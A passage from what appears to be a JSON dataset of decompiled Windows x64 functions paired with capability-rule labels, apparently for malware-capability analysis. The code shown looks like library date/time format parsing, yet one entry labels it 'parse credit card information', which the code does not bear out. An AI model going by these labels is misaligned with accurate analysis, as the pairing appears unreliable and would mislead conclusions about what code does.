piVar19[3] <= piVar19[2])) &&\n                   (iVar6 = (**(*piVar19 + 0x48))(piVar19),  iVar6 == -1)) {\n                    piVar19 = NULL;\n                    bVar18 = false;\n                    bVar5 = bVar10;\n                }\n                if (bVar5 == bVar20) {\ncode_r0x000140035e8d:\n                    uVar7 = uStack364;\n                    if (uStack364 < 0x45) {\n                        uVar7 = uStack364 + 100;\n                    }\n                }\n                else {\n                    uVar22 = fcn.140029e90(&uStack392);\n                    uVar4 = *(arg1_00 + uVar22 + 0x139);\n                    if (uVar4 == 0) {\n                        uVar4 = uVar22;\n                        if (*(*arg1_00 + 0x40) != 0x14002baf0) {\n                            uVar4 = (**(*arg1_00 + 0x40))(arg1_00);\n                        }\n                        if (uVar4 == 0x2a) goto code_r0x000140035e8d;\n                        *(arg1_00 + uVar22 + 0x139) = uVar4;\n                    }\n                    piVar15 = uStack392;\n                    if (9 < uVar4 - 0x30) goto code_r0x000140035e8d;\n                    uVar7 = (uVar4 - 0x30) + uStack364 * 10;\n                    puVar9 = uStack392[3];\n                    if (uStack392[2] < puVar9) {\n                        puVar16 = uStack392[2] + 1;\n                        uStack392[2] = puVar16;\n                    }\n                    else {\n                        (**(*uStack392 + 0x50))(uStack392);\n                        puVar16 = piVar15[2];\n                        puVar9 = piVar15[3];\n                    }\n                    uStack384 = 0xffffffff;\n                    uStack364 = uVar7;\n                    if (puVar16 < puVar9) {\n                        uVar8 = *puVar16;\n                    }\n                    else {\n                        uVar8 = (**(*piVar15 + 0x48))(piVar15);\n                        if (uVar8 == 0xffffffff) {\n                            uStack392 = NULL;\n                        }\n                    }\n                    if (((bVar18 != false) && (bVar17 = false,  piVar19[3] <= piVar19[2])) &&\n                       (iVar6 = (**(*piVar19 + 0x48))(piVar19),  iVar6 == -1)) {\n                        piVar19 = NULL;\n                        bVar17 = bVar18;\n                    }\n                    if (bVar17 != (uVar8 == 0xffffffff)) {\n                        uVar22 = fcn.140029e90(&uStack392);\n                        uVar4 = *(arg1_00 + uVar22 + 0x139);\n                        if (uVar4 == 0) {\n                            uVar4 = uVar22;\n                            if (*(*arg1_00 + 0x40) != 0x14002baf0) {\n                                uVar4 = (**(*arg1_00 + 0x40))(arg1_00);\n                            }\n                            if (uVar4 == 0x2a) goto code_r0x000140036112;\n                            *(arg1_00 + uVar22 + 0x139) = uVar4;\n                        }\n                        if (uVar4 - 0x30 < 10) {\n                            if (uStack392[2] < uStack392[3]) {\n                                uStack392[2] = uStack392[2] + 1;\n                            }\n                            else {\n                                (**(*uStack392 + 0x50))(uStack392);\n                            }\n                            uStack384 = 0xffffffff;\n                            uStack364 = (uVar4 - 0x30) + uVar7 * 10;\n                        }\n                    }\ncode_r0x000140036112:\n                    *(in_stack_00000048 + 1) = *(in_stack_00000048 + 1) & 0xfd;\n                    uVar7 = uStack364 - 0x76c;\n                }\n                uVar11 = uStack384;\n                in_stack_00000038[5] = uVar7;\n                piVar15 = uStack392;\n                piVar25 = arg_80h;\n            }\n            else {\n                uVar11 = uStack400;\n                piVar15 = piStack408;\n                piVar25 = arg_80h;\n            }\n        }\ncode_r0x000140034317:\n        uVar13 = uVar14 + 1;\n    }\n    if ((uVar13 == noname_10) && (uVar23 == 0)) goto code_r0x000140034538;\ncode_r0x000140034535:\n    *in_stack_00000030 = *in_stack_00000030 | 4;\ncode_r0x000140034538:\n    *arg1 = uStack392;\n    arg1[1] = uStack392._4_4_;\n    arg1[2] = uStack384;\n    arg1[3] = uStack380;\n    return arg1;\n}\n",
        "token_count": 13210
    },
    "140039d5": {
        "rules": [
            "parse credit card information/3266979fad224c5386fccfb7f2b301b7"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.140039d50(uint *arg1, ulong arg2, int64_t **noname_2, int64_t **arg4)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    bool bVar5;\n    uint16_t uVar6;\n    int16_t iVar7;\n    int16_t iVar8;\n    uint16_t uVar9;\n    int64_t arg_90h;\n    int64_t *piVar10;\n    uint64_t arg_78h;\n    int16_t *piVar11;\n    int16_t *piVar12;\n    bool bVar13;\n    uint32_t uVar14;\n    int64_t *piVar15;\n    int64_t *piVar16;\n    bool bVar17;\n    bool bVar18;\n    uint8_t uVar19;\n    bool bVar20;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    uint32_t *in_stack_00000038;\n    ulong in_stack_00000040;\n    uint32_t *in_stack_00000048;\n    uint32_t *in_stack_fffffffffffffe00;\n    uint32_t *noname_8;\n    ulong in_stack_fffffffffffffe08;\n    uint64_t noname_11;\n    uint in_stack_fffffffffffffe18;\n    uint32_t uVar21;\n    uint *in_stack_fffffffffffffe28;\n    int64_t *arg_88h;\n    int64_t *arg_88h_00;\n    int64_t *piStack440;\n    int64_t *piStack432;\n    uint uStack424;\n    uint uStack420;\n    uint32_t uStack416;\n    uint uStack412;\n    int64_t *piStack408;\n    uint16_t uStack400;\n    ulong uStack392;\n    uint uStack384;\n    uint uStack380;\n    uint32_t uStack368;\n    uint32_t uStack364;\n    int16_t *piStack360;\n    int16_t *piStack352;\n    uint uStack344;\n    uint uStack340;\n    uint uStack336;\n    uint uStack332;\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uint uStack316;\n    uint uStack312;\n    uint uStack308;\n    uint uStack304;\n    uint uStack300;\n    uint uStack296;\n    uint uStack292;\n    uint uStack288;\n    uint uStack284;\n    uint uStack280;\n    uint uStack276;\n    uint uStack272;\n    uint uStack268;\n    uint uStack264;\n    uint uStack260;\n    uint uStack256;\n    uint uStack252;\n    uint uStack248;\n    uint uStack244;\n    uint uStack240;\n    uint uStack236;\n    uint uStack232;\n    uint uStack228;\n    uint uStack224;\n    uint uStack220;\n    uint uStack216;\n    uint uStack212;\n    uint uStack208;\n    uint uStack204;\n    uint uStack200;\n    uint uStack196;\n    uint uStack192;\n    uint uStack188;\n    uint uStack184;\n    uint uStack180;\n    uint uStack176;\n    uint uStack172;\n    \n    piVar16 = arg4[1];\n    uStack392 = *noname_2;\n    uStack384 = *(noname_2 + 1);\n    uStack380 = *(noname_2 + 0xc);\n    piVar15 = *arg4;\n    arg_88h = piVar16;\n    arg_90h = fcn.1400b9790(in_stack_00000028 + 0xd0);\n    piVar10 = fcn.1400b9850(in_stack_00000028 + 0xd0);\n    arg_78h = sub.msvcrt.dll_wcslen(in_stack_00000040);\n    bVar17 = piVar16 == -1;\n    noname_11 = 0;\n    bVar18 = uStack384 == 0xffff;\n    uStack368 = 0;\n    uVar21 = 0;\n    if ((uStack392 != NULL) && (piVar16 = uStack392,  bVar20 = bVar18,  bVar18)) goto code_r0x000140039fa1;\ncode_r0x000140039e60:\n    bVar13 = piVar15 != NULL && bVar17;\n    bVar20 = bVar18;\n    if (bVar13) goto code_r0x000140039fd8;\ncode_r0x000140039e73:\n    if (bVar18 == bVar17) {\ncode_r0x00014003a010:\n        if ((noname_11 != arg_78h) || (uVar21 != 0)) {\ncode_r0x00014003a037:\n            *in_stack_00000030 = *in_stack_00000030 | 4;\n        }\n        *arg1 = uStack392;\n        arg1[1] = uStack392._4_4_;\n        arg1[2] = uStack384;\n        arg1[3] = uStack380;\n        return arg1;\n    }\n    do {\n        if (arg_78h <= noname_11) goto code_r0x00014003a010;\n        if (uVar21 != 0) goto code_r0x00014003a037;\n        cVar2 = (**(*piVar10 + 0x60))(piVar10);\n        if (cVar2 != '%') {\n            cVar2 = (**(*piVar10 + 0x10))(piVar10);\n            piVar16 = uStack392;\n            if (cVar2 == '\\0') {\n                bVar18 = uStack392 != NULL;\n                uVar6 = (**(*piVar10 + 0x40))(piVar10);\n                in_stack_fffffffffffffe28 = in_stack_fffffffffffffe28 & 0xffffffffffff0000 | uVar6;\n                bVar13 = bVar20 & bVar18;\n                if (bVar13 != false) {\n                    if (piVar16[2] < piVar16[3]) {\n                        iVar7 = *piVar16[2];\n                    }\n                    else {\n                        iVar7 = (**(*piVar16 + 0x48))(piVar16);\n                    }\n                    bVar18 = bVar13;\n                    if (iVar7 == -1) {\n                        uStack392 = NULL;\n                        bVar18 = false;\n                        piVar16 = NULL;\n                    }\n                }\n                iVar7 = (**(*piVar10 + 0x40))(piVar10);\n                if (in_stack_fffffffffffffe28 != iVar7) {\n                    iVar7 = (**(*piVar10 + 0x30))(piVar10);\n                    if ((bVar20 != false) && (bVar18 != false)) {\n                        if (piVar16[2] < piVar16[3]) {\n                            iVar8 = *piVar16[2];\n                        }\n                        else {\n                            iVar8 = (**(*piVar16 + 0x48))(piVar16);\n                        }\n                        if (iVar8 == -1) {\n                            uStack392 = NULL;\n                        }\n                    }\n                    iVar8 = (**(*piVar10 + 0x30))(piVar10);\n                    piVar16 = uStack392;\n                    arg_88h_00 = arg_88h;\n                    if (iVar7 != iVar8) goto code_r0x000140039f66;\n                }\ncode_r0x00014003a100:\n                if (piVar16[2] < piVar16[3]) {\n                    piVar16[2] = piVar16[2] + 2;\n                }\n                else {\n                    (**(*piVar16 + 0x50))(piVar16);\n                }\n                uStack384 = CONCAT22(uStack384._2_2_, 0xffff);\n                uStack384._0_2_ = 0xffff;\n            }\n            else {\n                while( true ) {\n                    uVar19 = uStack384 == 0xffff;\n                    uVar3 = piVar16 != NULL && uVar19;\n                    if (piVar16 != NULL && uVar19) {\n                        if (piVar16[2] < piVar16[3]) {\n                            iVar7 = *piVar16[2];\n                        }\n                        else {\n                            in_stack_fffffffffffffe28 = in_stack_fffffffffffffe28 & 0xffffffffffffff00 | uVar3;\n                            iVar7 = (**(*piVar16 + 0x48))(piVar16);\n                            uVar3 = in_stack_fffffffffffffe28;\n                        }\n                        uVar19 = 0;\n                        if (iVar7 == -1) {\n                            piVar16 = NULL;\n                            uStack392 = NULL;\n                            uVar19 = uVar3;\n                            uVar3 = 0;\n                        }\n                    }\n                    bVar18 = piVar15 != NULL && bVar17;\n                    bVar20 = bVar17;\n                    if (bVar18) {\n                        if (piVar15[2] < piVar15[3]) {\n                            iVar7 = *piVar15[2];\n                        }\n                        else {\n                            in_stack_fffffffffffffe28 = in_stack_fffffffffffffe28 & 0xffffffffffffff00 | uVar3;\n                            iVar7 = (**(*piVar15 + 0x48))(piVar15);\n                            uVar3 = in_stack_fffffffffffffe28;\n                        }\n                        bVar20 = false;\n                        if (iVar7 == -1) {\n                            piVar15 = NULL;\n                            bVar20 = bVar18;\n                        }\n                    }\n                    if (uVar19 == bVar20) break;\n                    if (uVar3 != 0) {\n                        if (piVar16[2] < piVar16[3]) {\n                            iVar7 = *piVar16[2];\n                        }\n                        else {\n                            iVar7 = (**(*piVar16 + 0x48))(piVar16);\n                        }\n                        if (iVar7 == -1) {\n                            uStack392 = NULL;\n                            piVar16 = NULL;\n                        }\n                    }\n                    cVar2 = (**(*piVar10 + 0x10))(piVar10);\n                    if (cVar2 == '\\0') break;\n                    if (piVar16[2] < piVar16[3]) {\n                        piVar16[2] = piVar16[2] + 2;\n                    }\n                    else {\n                        (**(*piVar16 + 0x50))(piVar16);\n                    }\n                    uStack384._0_2_ = 0xffff;\n                    uStack384 = CONCAT22(uStack384._2_2_, 0xffff);\n                }\n            }\n            goto code_r0x000140039f81;\n        }\n        cVar2 = (**(*piVar10 + 0x60))(piVar10);\n        uStack364 = 0;\n        if ((cVar2 == 'E') || (cVar2 == 'O')) {\n            noname_11 = noname_11 + 2;\n            cVar2 = (**(*piVar10 + 0x60))(piVar10);\n        }\n        else {\n            noname_11 = noname_11 + 1;\n        }\n        piVar16 = uStack392;\n        bVar18 = piVar15 != NULL && bVar17;\n        arg_88h_00 = arg_88h;\n    // switch table (85 cases) at 0x14010b3dc\n        switch(cVar2 + -0x25) {\n        case '\\0':\n            uVar6 = uStack384;\n            if ((uStack392 != NULL) && (bVar20 != false)) {\n                if (uStack392[2] < uStack392[3]) {\n                    uVar6 = *uStack392[2];\n                }\n                else {\n                    uVar6 = (**(*uStack392 + 0x48))(uStack392);\n                }\n                if (uVar6 == 0xffff) {\n                    uStack392 = NULL;\n                    piVar16 = NULL;\n                }\n            }\n            uVar9 = (**(*piVar10 + 0x50))(piVar10);\n            if (uVar9 == uVar6) goto code_r0x00014003a100;\n            uStack368 = 4;\n            uVar21 = 4;\n            break;\n        default:\ncode_r0x000140039f66:\n            uStack368 = 4;\n            piVar16 = uStack392;\n            uVar21 = 4;\n            arg_88h = arg_88h_00;\n            break;\n        case '\\x1c':\n        case '<':\n            iVar1 = *(arg_90h + 0x10);\n            uStack280 = *(iVar1 + 0xa8);\n            uStack276 = *(iVar1 + 0xac);\n            uStack272 = *(iVar1 + 0xb0);\n            uStack268 = *(iVar1 + 0xb4);\n            uStack344 = *(iVar1 + 0x68);\n            uStack340 = *(iVar1 + 0x6c);\n            uStack336 = *(iVar1 + 0x70);\n            uStack332 = *(iVar1 + 0x74);\n            uStack328 = *(iVar1 + 0x78);\n            uStack324 = *(iVar1 + 0x7c);\n            uStack320 = *(iVar1 + 0x80);\n            uStack316 = *(iVar1 + 0x84);\n            uStack312 = *(iVar1 + 0x88);\n            uStack308 = *(iVar1 + 0x8c);\n            uStack304 = *(iVar1 + 0x90);\n            uStack300 = *(iVar1 + 0x94);\n            uStack296 = *(iVar1 + 0x98);\n            uStack292 = *(iVar1 + 0x9c);\n            uStack288 = *(iVar1 + 0xa0);\n            uStack284 = *(iVar1 + 0xa4);\n            uStack264 = *(iVar1 + 0xb8);\n            uStack260 = *(iVar1 + 0xbc);\n            uStack256 = *(iVar1 + 0xc0);\n            uStack252 = *(iVar1 + 0xc4);\n            piStack360 = *(iVar1 + 0x58);\n            piStack352 = *(iVar1 + 0x60);\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar15;\n            piStack432 = arg_88h;\n            fcn.140038e30(&piStack408, arg2, &uStack424, &piStack440, &uStack364, &piStack360, 0xe, in_stack_00000028, \n                          &uStack368, in_stack_fffffffffffffe00, in_stack_fffffffffffffe08, noname_11, \n                          CONCAT44(uVar21, in_stack_fffffffffffffe18), arg_78h, in_stack_fffffffffffffe28, arg_88h, \n                          arg_90h);\n            uStack392 = piStack408;\n            uStack384 = uStack384 & 0xffff0000 | uStack400;\n            piVar16 = piStack408;\n            uStack384._0_2_ = uStack400;\n            uVar21 = uStack368;\n            if (uStack368 == 0) {\n                in_stack_00000038[6] = uStack364 % 7;\n                *in_stack_00000048 = *in_stack_00000048 | 2;\n                piVar16 = piStack408;\n            }\n            break;\n        case '\\x1d':\n        case '=':\n        case 'C':\n            iVar1 = *(arg_90h + 0x10);\n            uStack216 = *(iVar1 + 0x158);\n            uStack212 = *(iVar1 + 0x15c);\n            uStack208 = *(iVar1 + 0x160);\n            uStack204 = *(iVar1 + 0x164);\n            uStack264 = *(iVar1 + 0x128);\n            uStack260 = *(iVar1 + 300);\n            uStack256 = *(iVar1 + 0x130);\n            uStack252 = *(iVar1 + 0x134);\n            uStack248 = *(iVar1 + 0x138);\n            uStack244 = *(iVar1 + 0x13c);\n            uStack240 = *(iVar1 + 0x140);\n            uStack236 = *(iVar1 + 0x144);\n            uStack232 = *(iVar1 + 0x148);\n            uStack228 = *(iVar1 + 0x14c);\n            uStack224 = *(iVar1 + 0x150);\n            uStack220 = *(iVar1 + 0x154);\n            uStack200 = *(iVar1 + 0x168);\n            uStack196 = *(iVar1 + 0x16c);\n            uStack192 = *(iVar1 + 0x170);\n            uStack188 = *(iVar1 + 0x174);\n            uStack184 = *(iVar1 + 0x178);\n            uStack180 = *(iVar1 + 0x17c);\n            uStack176 = *(iVar1 + 0x180);\n            uStack172 = *(iVar1 + 0x184);\n            uStack296 = *(iVar1 + 0x108);\n            uStack292 = *(iVar1 + 0x10c);\n            uStack288 = *(iVar1 + 0x110);\n            uStack284 = *(iVar1 + 0x114);\n            uStack280 = *(iVar1 + 0x118);\n            uStack276 = *(iVar1 + 0x11c);\n            uStack272 = *(iVar1 + 0x120);\n            uStack268 = *(iVar1 + 0x124);\n            uStack344 = *(iVar1 + 0xd8);\n            uStack340 = *(iVar1 + 0xdc);\n            uStack336 = *(iVar1 + 0xe0);\n            uStack332 = *(iVar1 + 0xe4);\n            uStack328 = *(iVar1 + 0xe8);\n            uStack324 = *(iVar1 + 0xec);\n            uStack320 = *(iVar1 + 0xf0);\n            uStack316 = *(iVar1 + 0xf4);\n            uStack312 = *(iVar1 + 0xf8);\n            uStack308 = *(iVar1 + 0xfc);\n            uStack304 = *(iVar1 + 0x100);\n            uStack300 = *(iVar1 + 0x104);\n            piStack360 = *(iVar1 + 200);\n            piStack352 = *(iVar1 + 0xd0);\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar15;\n            piStack432 = arg_88h;\n            fcn.140038e30(&piStack408, arg2, &uStack424, &piStack440, &uStack364, &piStack360, 0x18, in_stack_00000028, \n                          &uStack368, in_stack_fffffffffffffe00, in_stack_fffffffffffffe08, noname_11, \n                          CONCAT44(uVar21, in_stack_fffffffffffffe18), arg_78h, in_stack_fffffffffffffe28, arg_88h, \n                          arg_90h);\n            uStack392 = piStack408;\n            uStack384 = uStack384 & 0xffff0000 | uStack400;\n            piVar16 = piStack408;\n            uStack384._0_2_ = uStack400;\n            uVar21 = uStack368;\n            if (uStack368 == 0) {\n                in_stack_00000038[4] = uStack364 % 0xc;\n                *in_stack_00000048 = *in_stack_00000048 | 0x408;\n                piVar16 = piStack408;\n            }\n            break;\n        case '\\x1e':\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar15;\n            piStack432 = arg_88h;\n            fcn.140038900(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack384 & 0xffff0000 | uStack400;\n            piVar16 = piStack408;\n            uStack384._0_2_ = uStack400;\n            uVar21 = uStack368;\n            if (uStack368 == 0) {\n                *in_stack_00000048 = *in_stack_00000048 | 0x480;\n                in_stack_00000048[1] = uStack364;\n                piVar16 = piStack408;\n            }\n            break;\n        case '\\x1f':\n            (**(*piVar10 + 0x58))(piVar10, 0x14010b3c4, 0x14010b3cd, &piStack360);\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            goto code_r0x00014003b1e8;\n        case '#':\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar15;\n            piStack432 = arg_88h;\n            fcn.140038900(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack384 & 0xffff0000 | uStack400;\n            piVar16 = piStack408;\n            uStack384._0_2_ = uStack400;\n            uVar21 = uStack368;\n            if (uStack368 == 0) {\n                in_stack_00000038[2] = uStack364;\n                *in_stack_00000048 = *in_stack_00000048 & 0xfe;\n                piVar16 = piStack408;\n            }\n            break;\n        case '$':\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar15;\n            piStack432 = arg_88h;\n            fcn.140038900(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack384 & 0xffff0000 | uStack400;\n            piVar16 = piStack408;\n            uStack384._0_2_ = uStack400;\n            uVar21 = uStack368;\n            if (uStack368 == 0) {\n                in_stack_00000038[2] = uStack364 % 0xc;\n                *in_stack_00000048 = *in_stack_00000048 | 1;\n                piVar16 = piStack408;\n            }\n            break;\n        case '(':\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar15;\n            piStack432 = arg_88h;\n            fcn.140038900(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack384 & 0xffff0000 | uStack400;\n            piVar16 = piStack408;\n            uStack384._0_2_ = uStack400;\n            uVar21 = uStack368;\n            if (uStack368 == 0) {\n                in_stack_00000038[1] = uStack364;\n                piVar16 = piStack408;\n            }\n            break;\n        case '-':\n            (**(*piVar10 + 0x58))(piVar10, 0x14010b3cd, 0x14010b3d3, &piStack360);\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            goto code_r0x00014003ab92;\n        case '.':\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar15;\n            piStack432 = arg_88h;\n            fcn.140038900(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack384 & 0xffff0000 | uStack400;\n            piVar16 = piStack408;\n            uStack384._0_2_ = uStack400;\n            uVar21 = uStack368;\n            if (uStack368 == 0) {\n                *in_stack_00000038 = uStack364;\n                piVar16 = piStack408;\n            }\n            break;\n        case '/':\n            (**(*piVar10 + 0x58))(piVar10, 0x14010b3d3, 0x14010b3dc, &piStack360);\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            goto code_r0x00014003ab92;\n        case '0':\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar15;\n            piStack432 = arg_88h;\n            fcn.140038900(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack384 & 0xffff0000 | uStack400;\n            piVar16 = piStack408;\n            uStack384._0_2_ = uStack400;\n            uVar21 = uStack368;\n            if (uStack368 == 0) {\n                in_stack_fffffffffffffe28 = in_stack_fffffffffffffe28 & 0xffffffff00000000 | *in_stack_00000048;\n                *in_stack_00000048 = (uStack364 & 0x3f) << 0x10 | 0x20 | *in_stack_00000048 & 0xffc0ffdf;\n                piVar16 = piStack408;\n            }\n            break;\n        case '2':\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar15;\n            piStack432 = arg_88h;\n            fcn.140038900(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack384 & 0xffff0000 | uStack400;\n            piVar16 = piStack408;\n            uStack384._0_2_ = uStack400;\n            uVar21 = uStack368;\n            if (uStack368 == 0) {\n                in_stack_fffffffffffffe28 = in_stack_fffffffffffffe28 & 0xffffffff00000000 | *in_stack_00000048;\n                *in_stack_00000048 = (uStack364 & 0x3f) << 0x10 | 0x40 | *in_stack_00000048 & 0xffc0ffbf;\n                piVar16 = piStack408;\n            }\n            break;\n        case '3':\n            goto code_r0x00014003af20;\n        case '4':\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar15;\n            piStack432 = arg_88h;\n            fcn.140038900(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack384 & 0xffff0000 | uStack400;\n            piVar16 = piStack408;\n            uStack384._0_2_ = uStack400;\n            uVar21 = uStack368;\n            if (uStack368 == 0) {\n                in_stack_00000038[5] = uStack364 - 0x76c;\n                in_stack_fffffffffffffe28 = in_stack_fffffffffffffe28 & 0xffffffffffffff00 | *(in_stack_00000048 + 1);\n                *(in_stack_00000048 + 1) = *(in_stack_00000048 + 1) & 0xf9 | 4;\n                piVar16 = piStack408;\n            }\n            break;\n        case '5':\n            if ((uStack392 != NULL) && (bVar20 != false)) {\n                if (uStack392[2] < uStack392[3]) {\n                    iVar7 = *uStack392[2];\n                }\n                else {\n                    iVar7 = (**(*uStack392 + 0x48))();\n                }\n                arg_88h_00 = arg_88h;\n                if (iVar7 == -1) {\n                    uStack392 = NULL;\n                }\n            }\n            cVar2 = (**(*piVar10 + 0x10))(piVar10);\n            if (cVar2 == '\\0') goto code_r0x000140039f66;\n            noname_8 = &uStack368;\n            in_stack_fffffffffffffe28 = &uStack424;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar15;\n            piStack432 = arg_88h_00;\n            fcn.140038e30(&piStack408, arg2, in_stack_fffffffffffffe28, &piStack440, &piStack360, *0x14010ff10, 0xe, \n                          in_stack_00000028, noname_8, in_stack_fffffffffffffe00, in_stack_fffffffffffffe08, noname_11, \n                          CONCAT44(uVar21, in_stack_fffffffffffffe18), arg_78h, in_stack_fffffffffffffe28, arg_88h_00, \n                          arg_90h);\n            uStack384._0_2_ = uStack400;\n            cVar2 = uStack400 == 0xffff;\n            uStack392 = piStack408;\n            uStack384 = uStack384 & 0xffff0000 | uStack400;\n            if ((piStack408 != NULL) && (cVar2)) {\n                if (piStack408[2] < piStack408[3]) {\n                    iVar7 = *piStack408[2];\n                }\n                else {\n                    iVar7 = (**(*piStack408 + 0x48))();\n                }\n                if (iVar7 == -1) {\n                    uStack392 = NULL;\n                }\n                cVar2 = iVar7 == -1;\n            }\n            bVar20 = bVar17;\n            if (bVar18) {\n                if (piVar15[2] < piVar15[3]) {\n                    iVar7 = *piVar15[2];\n                }\n                else {\n                    iVar7 = (**(*piVar15 + 0x48))(piVar15);\n                }\n                bVar20 = iVar7 == -1 && bVar18;\n                if (iVar7 == -1) {\n                    piVar15 = NULL;\n                }\n            }\n            piVar16 = uStack392;\n            uVar21 = uStack368;\n            arg_88h = arg_88h_00;\n            if ((cVar2 != bVar20) && ((uStack368 | piStack360) == 0)) {\n                iVar7 = fcn.140029f90(&uStack392);\n                iVar8 = (**(*piVar10 + 0x50))(piVar10, 0x2d);\n                if (iVar7 != iVar8) {\n                    iVar7 = fcn.140029f90(&uStack392);\n                    iVar8 = (**(*piVar10 + 0x50))(piVar10);\n                    if (iVar7 != iVar8) {\n                        piVar16 = uStack392;\n                        uStack384._0_2_ = uStack384;\n                        uVar21 = 0;\n                        arg_88h = arg_88h_00;\n                        break;\n                    }\n                }\n                uStack424 = uStack392;\n                uStack420 = uStack392._4_4_;\n                uStack416 = uStack384;\n                uStack412 = uStack380;\n                arg_88h = arg_88h_00;\n                piStack440 = piVar15;\n                piStack432 = arg_88h_00;\n                fcn.140038900(&piStack408, arg2, in_stack_fffffffffffffe28, &piStack440);\n                uStack384 = uStack384 & 0xffff0000 | uStack400;\n                uStack392 = piStack408;\n                uStack392._0_4_ = SUB84(piStack408, 0);\n                uStack392._4_4_ = piStack408 >> 0x20;\n                uStack424 = uStack392;\n                uStack420 = uStack392._4_4_;\n                uStack416 = uStack384;\n                uStack412 = uStack380;\n                piStack440 = piVar15;\n                piStack432 = arg_88h_00;\n                fcn.140038900(&piStack408, arg2, in_stack_fffffffffffffe28, &piStack440);\n                uStack392 = piStack408;\n                uStack384 = uStack384 & 0xffff0000 | uStack400;\n                piVar16 = piStack408;\n                uStack384._0_2_ = uStack400;\n                in_stack_fffffffffffffe00 = noname_8;\n                uVar21 = uStack368;\n            }\n            break;\n        case '>':\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\ncode_r0x00014003b1e8:\n            piStack440 = piVar15;\n            piStack432 = arg_88h;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            fcn.140039d50(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack384 & 0xffff0000 | uStack400;\n            piVar16 = piStack408;\n            uStack384._0_2_ = uStack400;\n            uVar21 = uStack368;\n            if (uStack368 == 0) {\n                *(in_stack_00000048 + 1) = *(in_stack_00000048 + 1) | 4;\n                piVar16 = piStack408;\n            }\n            break;\n        case '?':\n        case '@':\n            if ((uStack392 != NULL) && (bVar20 != false)) {\n                if (uStack392[2] < uStack392[3]) {\n                    uStack384._0_2_ = *uStack392[2];\n                }\n                else {\n                    uStack384._0_2_ = (**(*uStack392 + 0x48))();\n                }\n                if (uStack384 == 0xffff) {\n                    uStack392 = NULL;\n                }\n            }\n            cVar2 = (**(*piVar10 + 0x10))(piVar10, 0x20, uStack384);\n            if (cVar2 != '\\0') {\n                if (uStack392[2] < uStack392[3]) {\n                    uStack392[2] = uStack392[2] + 2;\n                }\n                else {\n                    (**(*uStack392 + 0x50))();\n                }\n                uStack384 = CONCAT22(uStack384._2_2_, 0xffff);\n            }\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar15;\n            piStack432 = arg_88h;\n            fcn.140038900(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack384 & 0xffff0000 | uStack400;\n            piVar16 = piStack408;\n            uStack384._0_2_ = uStack400;\n            uVar21 = uStack368;\n            if (uStack368 == 0) {\n                in_stack_00000038[3] = uStack364;\n                *in_stack_00000048 = *in_stack_00000048 | 0x410;\n                piVar16 = piStack408;\n            }\n            break;\n        case 'E':\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar15;\n            piStack432 = arg_88h;\n            fcn.140038900(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack384 & 0xffff0000 | uStack400;\n            piVar16 = 